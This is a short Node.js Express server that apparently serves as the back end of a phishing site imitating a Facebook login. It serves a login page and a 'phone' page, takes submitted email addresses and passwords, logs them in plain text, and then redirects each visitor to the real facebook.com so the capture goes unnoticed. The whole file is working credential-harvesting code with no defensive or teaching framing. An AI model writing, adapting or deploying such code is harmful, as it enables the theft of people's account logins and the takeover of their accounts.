const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const PORT = 3000;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (like HTML, CSS, JS, images)
app.use(express.static('public'));

// Serve the login page when accessing the root URL
app.get('/', (req, res) => {
    console.log('Sending index page...');
    res.sendFile(__dirname + '/public/index.html'); // Ensure the file path is correct
});

// Serve the phone page
app.get('/phone', (req, res) => {
    console.log('Sending phone page...');
    res.sendFile(__dirname + '/public/phone.html'); // Ensure the file path is correct
});

// Handle form submission from both pages
app.post('/login', (req, res) => {
    // Log the entire body to debug
    console.log('Form data received:', req.body);

    // Extract email and password fields from the form data
    const { email, password } = req.body;
    if (email && password) {
        console.log(`Received login request with email: ${email} and password: ${password}`);
    } else {
        console.log('Email or password is missing!');
    }

    // Redirect to Facebook after processing
    res.redirect('https://www.facebook.com/'); // Change destination as needed
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
